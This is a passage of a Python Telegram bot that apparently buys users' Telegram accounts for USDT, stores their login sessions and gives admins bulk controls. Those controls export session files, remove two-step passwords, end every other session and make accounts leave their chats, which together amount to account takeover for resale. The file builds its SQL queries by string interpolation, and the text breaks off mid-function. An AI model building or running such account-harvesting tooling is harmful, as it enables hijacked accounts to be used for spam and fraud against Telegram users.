import os, re, time, shutil, phonenumbers, telegram, telegram.ext, utility as utl
from datetime import datetime, timedelta
import base64
import requests

directory = os.path.dirname(os.path.abspath(__file__))
filename = str(os.path.basename(__file__))

utl.get_params_pids_by_full_script_name(script_names=[f"{directory}/{filename}"], is_kill_proccess=True)
print(f"Ok:- {filename}")

if not os.path.exists(f"{directory}/sessions"):
    os.mkdir(f"{directory}/sessions")
if not os.path.exists(f"{directory}/data"):
    os.mkdir(f"{directory}/data")

def get_usdt_to_trx(usdt):
    url = "https://api.binance.com/api/v3/ticker/price?symbol=TRXUSDT"
    price = float(requests.get(url).json()["price"])
    return round(usdt / price, 4)

def user_panel(message, text=None):
    if not text:
        text = "Choose one of the following options :"
    message.reply_html(text=text,
       reply_markup={'resize_keyboard': True, 'keyboard': [
            [{'text': '📤 Send Account'}],
            [{'text': '☎️ Support'}, {'text': '👤 User Account'}],
            [{'text': '🌎 Allowed Countries'}, {'text': '✅ Settlement'}],
        ]}
    )


def callbackquery_process(update: telegram.Update, context: telegram.ext.CallbackContext) -> None:
    bot = context.bot
    query = update.callback_query
    from_id = query.from_user.id
    message = query.message
    message_id = message.message_id
    chat_id = message.chat.id
    data = query.data
    ex_data = data.split(';')
    timestamp = int(time.time())
    try:
        if data == "nazan":
            return query.answer(text="Don't let it break 😕", show_alert=True)
        elif data == "delete":
            message.delete()
            if message.reply_to_message:
                message.reply_to_message.delete()
            return
        
        cs = utl.Database()
        cs = cs.data()

        cs.execute(f"SELECT * FROM {utl.admin}")
        row_admin = cs.fetchone()
        cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={from_id}")
        row_user = cs.fetchone()

        if data == 'start':
            if not row_admin['onoff_bot']:
                return message.reply_html(text="The bot is down for maintenance, please try again in a few minutes", reply_to_message_id=message_id)
            try:
                inline_keyboard = []
                if row_admin['channel_1'] is not None and bot.get_chat_member(chat_id=f"@{row_admin['channel_1']}", user_id=from_id).status == "left":
                    inline_keyboard.append([{'text': 'Login to the channel', 'url': f"https://t.me/{row_admin['channel_1']}"}])
                elif row_admin['channel_2'] is not None and bot.get_chat_member(chat_id=f"@{row_admin['channel_2']}", user_id=from_id).status == "left":
                    inline_keyboard.append([{'text': 'Login to the channel', 'url': f"https://t.me/{row_admin['channel_2']}"}])
                elif row_admin['channel_3'] is not None and bot.get_chat_member(chat_id=f"@{row_admin['channel_3']}", user_id=from_id).status == "left":
                    inline_keyboard.append([{'text': 'Login to the channel', 'url': f"https://t.me/{row_admin['channel_3']}"}])
                if inline_keyboard:
                    return query.answer(text="⚠️ You are not yet subscribed to our channels", show_alert=True)
            except:
                pass
            cs.execute(f"UPDATE {utl.users} SET step='start' WHERE user_id={from_id}")
            user_panel(message)
            return message.delete()
        elif ex_data[0] == 'confirm_phone':
            cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_data[1])} AND status=3")
            row_mbots = cs.fetchone()
            if row_mbots is None:
                return query.answer(text="❌ The operation has expired ", show_alert=True)
            else:
                if row_mbots['last_check_exit_count'] > 0:
                    row_admin['time_logout_account'] = 10
                if (timestamp - row_mbots['last_check_exit_at']) < row_admin['time_logout_account']:
                    time_waite = row_admin['time_logout_account'] - (timestamp - row_mbots['last_check_exit_at'])
                    return query.answer(text=f"⚠️  {time_waite}Try another second ", show_alert=True)
                else:
                    cs.execute(f"UPDATE {utl.mbots} SET last_check_exit_at={timestamp},last_check_exit_count=last_check_exit_count+1 WHERE id={row_mbots['id']}")
                    info_msg = message.reply_html(text="♻️ Processing, please wait …", reply_to_message_id=message_id)
                    os.system(f"{utl.python_version} \"{directory}/tl_account.py\" {row_mbots['uniq_id']} {message_id} session")
                    return info_msg.delete()
        if from_id in utl.admins or row_user['status'] == 1:
            if ex_data[0] == 'pg':
                if ex_data[1] == 'accounts':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE user_id IS NOT NULL ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️There is no other page ", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            if row['status'] == 2:
                                output += f"{i}. Phone: <code>{row['phone']}</code>\n"
                                output += f"⛔ Restrict: ({utl.convert_time((row['end_restrict'] - timestamp),2)})\n"
                            else:
                                output += f"{i}. phone: <code>{row['phone']}</code> ({utl.status_mbots[row['status']]})\n"
                            output += f"🔸️ Status: /status_{row['id']}\n"
                            if row['status'] != 0:
                                output += f"🔸️ Get Session: /session_{row['id']}\n"
                                output += f"🔸️ Delete Sessions: /del_session_{row['id']}\n"
                                output += f"🔸️ Delete Password: /del_password_{row['id']}\n"
                            output += "\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL")
                        rowcount = cs.fetchone()['count']
                        output = f"📜List of all accounts ({rowcount})\n\n{output}"
                        ob = utl.Pagination(update, "accounts", output, utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1] == 'first_level':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=0 ORDER BY last_order_at DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️There is no other page ", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"{i}. Phone: <code>{row['phone']}</code> ({utl.status_mbots[row['status']]})\n"
                            output += f"🔸️ Status: /status_{row['id']}\n"
                            output += "\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=0")
                        rowcount = cs.fetchone()['count']
                        output = f"📜 List of unregistered accounts ({rowcount})\n\n{output}"
                        ob = utl.Pagination(update,"first_level",output,utl.step_page,rowcount)
                        return ob.process()
                elif ex_data[1] == 'submitted':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=1 ORDER BY last_order_at ASC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️ There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"{i}. Phone: <code>{row['phone']}</code> ({utl.status_mbots[row['status']]})\n"
                            output += f"🔸️ Status: /status_{row['id']}\n"
                            output += f"🔸️ Get Session: /session_{row['id']}\n"
                            output += f"🔸️ Delete Sessions: /del_session_{row['id']}\n"
                            output += f"🔸️ Delete Password: /del_password_{row['id']}\n"
                            output += "\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=1")
                        rowcount = cs.fetchone()['count']
                        output = f"📜 List of active accounts ({rowcount})\n\n{output}"
                        ob = utl.Pagination(update, "submitted", output, utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1] == 'waite_exit':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=3 ORDER BY last_order_at ASC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"{i}. Phone: <code>{row['phone']}</code> ({utl.status_mbots[row['status']]})\n"
                            output += f"🔸️ Status: /status_{row['id']}\n"
                            output += f"🔸️ Get Session: /session_{row['id']}\n"
                            output += f"🔸️ Delete Sessions: /del_session_{row['id']}\n"
                            output += f"🔸️ Delete Password: /del_password_{row['id']}\n"
                            output += "\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE user_id IS NOT NULL AND status=1")
                        rowcount = cs.fetchone()['count']
                        output = f"📜List of accounts pending withdrawal ({rowcount})\n\n{output}"
                        ob = utl.Pagination(update, "waite_exit", output, utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1] == 'apis':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.apis} ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️ There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"🔴️ Api ID: <code>{row['api_id']}</code>\n"
                            output += f"🔴️ Api Hash: <code>{row['api_hash']}</code>\n"
                            output += f"❌ Delete: /DeleteApi_{row['id']}\n\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.apis}")
                        rowcount = cs.fetchone()['count']
                        output = f"📜 API list({rowcount})\n\n{output}"
                        ob = utl.Pagination(update, "apis", output, utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1] == 'withdrawal':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.withdrawal} ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️ There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"🔰 ID: /w_{row['id']} ({utl.status_withdrawal[row['status']]})\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.withdrawal}")
                        rowcount = cs.fetchone()['count']
                        output = f"📜 Settlement list ({rowcount})\n\n{output}"
                        ob = utl.Pagination(update, "withdrawal", output, utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1] == 'users':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.users} ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️ There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"{i}. <a href='tg://user?id={row['user_id']}'>{row['user_id']}</a> (/d_{row['user_id']})\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.users}")
                        rowcount = cs.fetchone()['count']
                        ob = utl.Pagination(update, "users",f"📜 List of users ({rowcount})\n\n{output}", utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1] == 'admins':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.users} WHERE status=1 ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️ There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"{i}. <a href='tg://user?id={row['user_id']}'>{row['user_id']}</a> (/d_{row['user_id']})\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.users} WHERE status=1")
                        rowcount = cs.fetchone()['count']
                        ob = utl.Pagination(update, "admins",f"📜 List of admins ({rowcount})\n\n{output}", utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1] == 'blocked':
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.users} WHERE status=2 ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            output += f"{i}. <a href='tg://user?id={row['user_id']}'>{row['user_id']}</a> (/d_{row['user_id']})\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.users} WHERE status=2")
                        rowcount = cs.fetchone()['count']
                        ob = utl.Pagination(update, "blocked",f"📜 List of blocks ({rowcount})\n\n{output}", utl.step_page, rowcount)
                        return ob.process()
                elif ex_data[1][0:10] == 'accountsu_':
                    user_id_select = int(ex_data[1][10:])
                    selected_pages = (int(ex_data[2]) - 1) * utl.step_page
                    i = selected_pages + 1
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE creator_user_id={user_id_select} AND user_id IS NOT NULL ORDER BY id DESC LIMIT {selected_pages},{utl.step_page}")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⚠️ There is no other page", show_alert=True)
                    else:
                        output = ""
                        for row in result:
                            if row['status'] == 2:
                                output += f"{i}. Phone: <code>{row['phone']}</code>\n"
                                output += f"⛔ Restrict: ({utl.convert_time((row['end_restrict'] - timestamp),2)})\n"
                            else:
                                output += f"{i}. phone: <code>{row['phone']}</code> ({utl.status_mbots[row['status']]})\n"
                            output += f"🔸️ Status: /status_{row['id']}\n"
                            if row['status'] != 0:
                                output += f"🔸️ Get Session: /session_{row['id']}\n"
                                output += f"🔸️ Delete Sessions: /del_session_{row['id']}\n"
                                output += f"🔸️ Delete Password: /del_password_{row['id']}\n"
                            output += "\n"
                            i += 1
                        cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE creator_user_id={user_id_select} AND user_id IS NOT NULL")
                        rowcount = cs.fetchone()['count']
                        ob = utl.Pagination(update, f"accountsu_{user_id_select}", f"📜 List of user accounts {user_id_select} ({rowcount})\n\n{output}", utl.step_page, rowcount)
                        return ob.process()
            elif ex_data[0] == "settings":
                if (
                    ex_data[1] == "change_pass"
                    or ex_data[1] == "is_change_profile"
                    or ex_data[1] == "is_set_username"
                    or ex_data[1] == "onoff_bot"
                    or ex_data[1] == "onoff_account"
                    or ex_data[1] == "onoff_withdrawal"
                    or ex_data[1] == "onoff_support"
                ):
                    row_admin[ex_data[1]] = 1 - row_admin[ex_data[1]]
                    cs.execute(f"UPDATE {utl.admin} SET {ex_data[1]}={row_admin[ex_data[1]]}")
                elif ex_data[1] == "account_password":
                    cs.execute(f"UPDATE {utl.users} SET step='set_pass;none' WHERE user_id={from_id}")
                    return query.edit_message_text(text="Enter The New Password")
                else:
                    number = int(ex_data[2])
                    if ex_data[1] == 'api_per_number':
                        row_admin['api_per_number'] += number
                        if row_admin['api_per_number'] < 1:
                            return query.answer(text="❌It must be at least 1")
                        else:
                            cs.execute(f"UPDATE {utl.admin} SET api_per_number={row_admin['api_per_number']}")
                    elif ex_data[1] == 'time_logout_account':
                        row_admin['time_logout_account'] += number
                        if row_admin['time_logout_account'] < 10:
                            return query.answer(text="❌ It should be at least 10")
                        else:
                            cs.execute(f"UPDATE {utl.admin} SET time_logout_account={row_admin['time_logout_account']}")
                    else:
                        return
                account_password = row_admin['account_password'] if row_admin['account_password'] is not None else "not registered"
                api_per_number = f"Record {row_admin['api_per_number']} account per api" if row_admin['api_per_number'] <= 5 else f"⚠️ Record {row_admin['api_per_number']} account per api ⚠️"
                change_pass = " ✅ change / set the password on the account ✅" if row_admin['change_pass'] else "❌ change / set the password on the account ❌"
                is_change_profile = " ✅ Setting the name, bio and profile on the account ✅" if row_admin['is_change_profile'] else "❌ Setting the name, bio and profile on the account ❌"
                is_set_username = " ✅ Set username on account ✅" if row_admin['is_set_username'] else "❌ Set username on account ❌"
                onoff_bot = "The bot is on" if row_admin['onoff_bot'] else "The bot is off"
                onoff_account = " ✅ account sending is on" if row_admin['onoff_account'] else "❌ account sending is turned off"
                onoff_withdrawal = " ✅ account settlement is on" if row_admin['onoff_withdrawal'] else "❌ account settlement is off"
                onoff_support = "Support is on" if row_admin['onoff_support'] else "Support is off"
                return query.edit_message_text(
                    text="⚙️ Settings:",

                    reply_markup={'inline_keyboard': [
                        [{'text': f"password: {account_password}",'callback_data': "settings;account_password"}],
                        [{'text': api_per_number,'callback_data': "nazan"}],
                        [
                            {'text': '+10','callback_data': "settings;api_per_number;+10"},
                            {'text': '+5','callback_data': "settings;api_per_number;+5"},
                            {'text': '+1','callback_data': "settings;api_per_number;+1"},
                            {'text': '-1','callback_data': "settings;api_per_number;-1"},
                            {'text': '-5','callback_data': "settings;api_per_number;-5"},
                            {'text': '-10','callback_data': "settings;api_per_number;-10"},
                        ],
                        [{'text': f"Logout after {row_admin['time_logout_account']} Second",'callback_data': "nazan"}],
                        [
                            {'text': '+10','callback_data': "settings;time_logout_account;+100"},
                            {'text': '+5','callback_data': "settings;time_logout_account;+10"},
                            {'text': '+1','callback_data': "settings;time_logout_account;+5"},
                            {'text': '-1','callback_data': "settings;time_logout_account;-5"},
                            {'text': '-5','callback_data': "settings;time_logout_account;-10"},
                            {'text': '-10','callback_data': "settings;time_logout_account;-100"},
                        ],
                        [{'text': change_pass,'callback_data': "settings;change_pass"}],
                        [{'text': is_change_profile,'callback_data': "settings;is_change_profile"}],
                        [{'text': is_set_username,'callback_data': "settings;is_set_username"}],
                        [{'text': "〰️〰️〰️ On / Off〰️〰️〰️",'callback_data': "nazan"}],
                        [{'text': onoff_bot,'callback_data': "settings;onoff_bot"}],
                        [{'text': onoff_account,'callback_data': "settings;onoff_account"}],
                        [{'text': onoff_withdrawal,'callback_data': "settings;onoff_withdrawal"}],
                        [{'text': onoff_support,'callback_data': "settings;onoff_support"}],
                    ]}
                )
            elif ex_data[0] == "d":
                cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={int(ex_data[1])}")
                row_user_select = cs.fetchone()
                if row_user_select is None:
                    return query.answer(text="❌ ID is wrong")
                else:
                    value = ex_data[2]
                    if value == 'balance':
                        change_balance = row_user_select['balance'] + float(ex_data[3])
                        if change_balance <= 0:
                            if not row_user_select['balance']:
                                return query.answer(text="❌Invalid operation", show_alert=True)
                            else:
                                row_user_select['balance'] = 0
                        else:
                            row_user_select['balance'] = change_balance
                        cs.execute(f"UPDATE {utl.users} SET balance={round(row_user_select['balance'], 4)} WHERE user_id={row_user_select['user_id']}")
                    elif value == "sendmsg":
                        cs.execute(f"UPDATE {utl.users} SET step='sendmsg;{row_user_select['user_id']}' WHERE user_id={from_id}")
                        return bot.send_message(
                            chat_id=chat_id,
                            text="Send the message:\n"
                                "cancel: /panel"
                        )
                    else:
                        status = int(value)
                        if row_user_select['status'] == 1 or status == 1:
                            if from_id in utl.admins:
                                cs.execute(f"UPDATE {utl.users} SET status={status} WHERE user_id={row_user_select['user_id']}")
                            else:
                             return query.answer(text="⛔️This feature is for the main admin.", show_alert=True)
                        else:
                            cs.execute(f"UPDATE {utl.users} SET status={status} WHERE user_id={row_user_select['user_id']}")
                    cs.execute(f"SELECT * FROM {utl.users} WHERE user_id={row_user_select['user_id']}")
                    row_user_select = cs.fetchone()
                    block = 'Block ✅' if row_user_select['status'] == 2 else 'Block ❌'
                    block_status = 0 if row_user_select['status'] == 2 else 2
                    admin = 'Admin ✅' if row_user_select['status'] == 1 else 'Admin❌'
                    admin_status = 0 if row_user_select['status'] == 1 else 1
                    return message.edit_text(
                        text=f"user <a href='tg://user?id={row_user_select['user_id']}'>{row_user_select['user_id']}</a>",
                        parse_mode='HTML',
                        reply_markup={'inline_keyboard': [
                            [{'text': "send Message",'callback_data': f"d;{row_user_select['user_id']};sendmsg"}],
                            [
                                {'text': block,'callback_data': f"d;{row_user_select['user_id']};{block_status}"},
                                {'text': admin,'callback_data': f"d;{row_user_select['user_id']};{admin_status}"}
                            ],
                            [{'text': f"Inventory: {row_user_select['balance']}",'callback_data': "nazan"}],
                            [
                                {'text': '+5000','callback_data': f"d;{row_user_select['user_id']};balance;+5000"},
                                {'text': '+1000','callback_data': f"d;{row_user_select['user_id']};balance;+1000"},
                                {'text': '-1000','callback_data': f"d;{row_user_select['user_id']};balance;-1000"},
                                {'text': '-5000','callback_data': f"d;{row_user_select['user_id']};balance;-5000"},
                            ],
                        ]}
                    )
            elif ex_data[0] == 'gc':
                if ex_data[1] == 'delete_logout':
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE status=0")
                    result = cs.fetchall()
                    if result:
                        for row_mbots in result:
                            cs.execute(f"DELETE FROM {utl.mbots} WHERE id={row_mbots['id']}")
                            utl.remove_path(f"{directory}/sessions/{row_mbots['uniq_id']}.session")
                        return message.reply_html(text="✅ {len(result)} unregistered accounts were deleted")
                    else:
                        return query.answer(text="❌ No account found", show_alert=True)
                elif ex_data[1] == 'leave_channel':
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE status>0 AND ({timestamp}-last_leave_at)>86400 LIMIT 1")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⛔️ No account found, each account is checked once in 24 hours", show_alert=True)
                    else:
                        info_msg = message.reply_html(text="♻️ Processing, please wait …")
                        count_analyzable = cs.rowcount
                        count_analyze = 0
                        for row_mbots in result:
                            count_analyze += 1
                            os.system(
                                f"{utl.python_version} \"{directory}/tl_leave.py\" {row_mbots['uniq_id']} {from_id} channel {info_msg.message_id} \"{count_analyze},{count_analyzable},{timestamp}\""
                            )
                        message.reply_html(
                            text=" ✅ Leaving the group and channels has been completed\n\n"
                                f"👤 Accounts: <b>[{count_analyze:,} / {count_analyzable:,}]</b>\n"
                                "➖➖➖➖➖➖\n"
                                f"📅 Duration: <b>{utl.convert_time((int(time.time()) - timestamp), 2)}</b>",
                        )
                        return info_msg.delete()
                elif ex_data[1] == 'leave_private':
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE status>0 AND ({timestamp}-last_delete_chats_at)>86400 LIMIT 1")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⛔️ No account found, each account is checked once in 24 hours", show_alert=True)
                    else:
                        info_msg = message.reply_html(text="♻️ Processing, please wait...")
                        count_analyzable = cs.rowcount
                        count_analyze = 0
                        for row_mbots in result:
                            count_analyze += 1
                            os.system(f"{utl.python_version} \"{directory}/tl_leave.py\" {row_mbots['uniq_id']} {from_id} private {info_msg.message_id} \"{count_analyze},{count_analyzable},{timestamp}\"")
                        message.reply_html(
                            text=" ✅ The deletion of pews has been completed\n\n"
                                f"👤 Accounts: <b>[{count_analyze:,} / {count_analyzable:,}]</b>\n"
                                "➖➖➖➖➖➖\n"
                                f"📅 Duration: <b>{utl.convert_time((int(time.time()) - timestamp), 2)}</b>",
                        )
                        return info_msg.delete()
                elif ex_data[1] == 'leave_chat':
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE status>0 AND (({timestamp}-last_leave_at)>86400 OR ({timestamp}-last_delete_chats_at)>86400) LIMIT 1")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⛔️ No account found, each account is checked once in 24 hours", show_alert=True)
                    else:
                        info_msg = message.reply_html(text="♻️ Processing, please wait...")
                        count_analyzable = cs.rowcount
                        count_analyze = 0
                        for row_mbots in result:
                            count_analyze += 1
                            os.system(f"{utl.python_version} \"{directory}/tl_leave.py\" {row_mbots['uniq_id']} {from_id} all {info_msg.message_id} \"{count_analyze},{count_analyzable},{timestamp}\"")
                        message.reply_html(
                            text=" ✅ Leaving the group and channel and deleting the peewee has been completed\n\n"
                                f"👤 Accounts: <b>[{count_analyze:,} / {count_analyzable:,}]</b>\n"
                                "➖➖➖➖➖➖\n"
                                f"📅 Duration: <b>{utl.convert_time((int(time.time()) - timestamp), 2)}</b>",
                        )
                        return info_msg.delete()
                elif ex_data[1] == 'delete_password':
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE status=1")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⛔️ There is currently no account", show_alert=True)
                    elif ex_data[2] == 'none':
                        return message.reply_html(
                            text="❗️ Are you sure you want to delete all account passwords?",
                            reply_to_message_id=message_id,
                            reply_markup={'inline_keyboard': [[{'text': '❌ Cancel ❌', 'callback_data': "delete"}, {'text': ' ✅ Yes do ✅', 'callback_data': f"{ex_data [0]};{ex_data[1]};confirm"}]]}
                        )
                    elif ex_data[2] == 'confirm':
                        info_msg = message.reply_html(text="♻️ Processing, please wait...")
                        count_analyzable = len(result)
                        count_analyze = 0
                        for row_mbots in result:
                            count_analyze += 1
                            try:
                                info_msg.edit_text(
                                    text="⏳ Deleting passwords...\n\n"
                                        f"👤 Account: <b>[{count_analyze:,} / {count_analyzable:,}]</b>\n"
                                        f"♻️ Progress: <b>{(count_analyze / count_analyzable * 100):,.2f}%</b>\n"
                                        "➖➖➖➖➖➖\n"
                                        f"📅 Duration: <b>{utl.convert_time((int(time.time()) - timestamp), 2)}</b>",
                                )
                            except:
                                pass
                            os.system(f"{utl.python_version} \"{directory}/tl_delete_password.py\" {row_mbots['uniq_id']} {from_id} all")
                        message.reply_html(
                            text=" ✅ The removal of passwords has been completed\n\n"
                                f"👤 Accounts: <b>[{count_analyze:,} / {count_analyzable:,}]</b>\n"
                                "➖➖➖➖➖➖\n"
                                f"📅 Duration: <b>{utl.convert_time((int(time.time()) - timestamp), 2)}</b>",
                        )
                        return info_msg.delete()
                elif ex_data[1] == 'get_session':
                    cs.execute(f"SELECT COUNT(*) as count FROM {utl.mbots} WHERE status=1")
                    count_accounts = cs.fetchone()['count']
                    if count_accounts < 1:
                        return query.answer(text="⛔️ There is currently no account", show_alert=True)
                    else:
                        cs.execute(f"UPDATE {utl.users} SET step='get_sessions;none' WHERE user_id={from_id}")
                        return message.reply_html(
                            text=f"Send the count (between 1 and <code>{count_accounts}</code>):\n"
                                "cancel: /panel"
                        )
                elif ex_data[1] == 'del_sessions':
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE status=1")
                    result = cs.fetchall()
                    if not result:
                        return query.answer(text="⛔️ There is currently no account", show_alert=True)
                    elif ex_data[2] == 'none':
                        return message.reply_html(
                            text="❗️ Are you sure you want to log out all accounts from all sessions (except the bot session)?",
                            reply_to_message_id=message_id,
                            reply_markup={'inline_keyboard': [[{'text': '❌ Cancel ❌', 'callback_data': "delete"}, {'text': ' ✅ Yes do ✅', 'callback_data': f"{ex_data [0]};{ex_data[1]};confirm"}]]}
                        )
                    elif ex_data[2] == 'confirm':
                        info_msg = message.reply_html(text="♻️ Processing, please wait...")
                        count_analyzable = len(result)
                        count_analyze = 0
                        for row_mbots in result:
                            count_analyze += 1
                            try:
                                info_msg.edit_text(
                                    text="⏳ Ending meetings...\n\n"
                                        f"👤 Account:<b>[{count_analyze:,} / {count_analyzable:,}]</b>\n"
                                        f"♻️ Progress: <b>{(count_analyze / count_analyzable * 100):,.2f}%</b>\n"
                                        "➖➖➖➖➖➖\n"
                                        f" 📅 Duration:<b>{utl.convert_time((int(time.time()) - timestamp), 2)}</b>",
                                )
                            except:
                                pass
                            os.system(f"{utl.python_version} \"{directory}/tl_delete_sessions.py\" {row_mbots['uniq_id']} {from_id} all")
                        message.reply_html(
                            text=" ✅ Termination of sessions completed\n\n"
                                f"👤 Accounts: <b>[{count_analyze:,} / {count_analyzable:,}]</b>\n"
                                "➖➖➖➖➖➖\n"
                                f"📅 Duration: <b>{utl.convert_time((int(time.time()) - timestamp), 2)}</b>",
                        )
                        return info_msg.delete()
                elif ex_data[1] == 'logout':
                    cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={int(ex_data[2])}")
                    row_mbots = cs.fetchone()
                    if row_mbots is None or row_mbots['status'] == 0:
                        if row_mbots is not None:
                            cs.execute(f"DELETE FROM {utl.mbots} WHERE id={row_mbots['id']}")
                        query.answer(text=" ✅ Done", show_alert=True)
                        return message.delete()
                    elif ex_data[3] == 'none':
                        return message.reply_html(
                            text=f"❗️ Are you sure you want to log out of <code>{row_mbots['phone']}</code> account?\n\n"
                                "⚠️ After logging out, you will no longer have access to the account",
                            reply_to_message_id=message_id,
                            reply_markup={'inline_keyboard': [[{'text': '❌ Cancel ❌', 'callback_data': "delete"}, {'text': ' ✅ Yes do ✅', 'callback_data': f"{ex_data [0]};{ex_data[1]};{ex_data[2]};confirm"}]]}
                        )
                    elif ex_data[3] == 'confirm':
                        info_msg = message.reply_html(text="♻️ Processing, please wait...")
                        os.system(f"{utl.python_version} \"{directory}/tl_logout.py\" {row_mbots['uniq_id']} {from_id}")
                        cs.execute(f"SELECT * FROM {utl.mbots} WHERE id={row_mbots['id']}")
                        row_mbots = cs.fetchone()
                        if row_mbots is None:
                            info_msg.edit_text(text="Your account has been logged out")
                            return message.edit_reply_markup(reply_markup={'inline_keyboard': [[{'text': 'The account has been logged out ✅', 'callback_data': "nazan"}]]})
                        else:

                            return info_msg.edit_text(text="❌ An error occurred while logging out")
            elif ex_data[0] == 'withdrawal':
                cs.execute(f"SELECT * FROM {utl.withdrawal} WHERE id={int(ex_data[1])}")
                row_withdrawal = cs.fetchone()
                if row_withdrawal is None:
                    return query.answer(text="❌ ID is wrong", show_alert=True)
                elif ex_data[2] == 'accept':
                    cs.execute(f"UPDATE {utl.withdrawal} SET status=2 WHERE id={row_withdrawal['id']}")
                    message.edit_reply_markup(reply_markup={'inline_keyboard': [[{'text': "Send Message",'callback_data': f"d;{row_withdrawal['user_id']};sendmsg"}]]})
                    if row_withdrawal['status'] == 2:
                        return query.answer(text="❌ This settlement has already been done", show_alert=True)
                    bot.send_message(
                        chat_id=from_id,
                        text=" ✅ Account settlement was done successfully",
                        reply_to_message_id=message_id,
                    )
                    return bot.send_message(chat_id=row_withdrawal['user_id'], text=f"The account settlement was made to the ID {row_withdrawal['id']} and in the amount of {row_withdrawal['amount']} USDT")
    except telegram.error.RetryAfter:
        return query.answer(text="⚠️ work a little more slowly with the robot", show_alert=True)
    

def private_process(update: telegram.Update, context: telegram.ext.CallbackContext) -> None:
    bot = context.bot
    message = update.message
    from_id = message.from_user.id
    chat_id = message.chat.id
    first_name = message.from_user.first_name
    message_id = message.message_id
    user_info = bot.get_chat(from_id)
    user_username = user_info.username if user_info.username else 'NoUsername'
    gmt_plus_6 = datetime.utcnow() + timedelta(hours=6)
    formatted_datetime = gmt_plus_6.strftime("%Y-%m-%d %H:%M:%S")
    text = message.text if message.text else ""
    if message.text:
        txtcap = message.text
    elif message.caption:
